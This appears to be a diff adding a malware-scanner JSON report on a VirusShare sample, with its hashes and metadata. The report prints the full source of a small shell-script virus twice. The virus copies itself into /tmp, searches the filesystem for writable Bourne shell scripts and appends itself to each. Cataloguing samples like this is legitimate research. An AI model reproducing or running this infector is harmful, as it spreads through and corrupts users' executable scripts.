@@ -1,0 +1,41 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "exec": "May run an executable file or a system command using Excel 4 Macros"
+        },
+        "macro": "tail -n 8 $0 > /tmp/vicGWI\nfind / -type f -perm +111 -exec bash -c \\\n\"if [ ! -d {} ] && [ -z \\\"\\`grep -s Gobleen {}\\`\\\" -a -x {} -a -w {} ] ; then\n    if [ -n \\\"\\`file {} | grep Bourne\\`\\\" ] ; then\n        echo >> {}\n        cat /tmp/vicGWI >> {}\nfi; fi\" \\;\nrm /tmp/vicGWI"
+    },
+    "filename": "VirusShare_54cb9661461f836825c39d2dc02d2c0f",
+    "filesize": 281,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "54cb9661461f836825c39d2dc02d2c0f",
+        "sha1": "4edc9f5e27b6c1faf60822c190b9f5065189be09",
+        "sha256": "56229417854f5c0d059cd9551436a473f91fce0a514da5ef8ee92aecf7329e0d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "tail -n 8 $0 > /tmp/vicGWI",
+            "find / -type f -perm +111 -exec bash -c \\",
+            "\"if [ ! -d {} ] && [ -z \\\"\\`grep -s Gobleen {}\\`\\\" -a -x {} -a -w {} ] ; then",
+            "    if [ -n \\\"\\`file {} | grep Bourne\\`\\\" ] ; then",
+            "        echo >> {}",
+            "        cat /tmp/vicGWI >> {}",
+            "fi; fi\" \\;",
+            "rm /tmp/vicGWI"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.261258",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
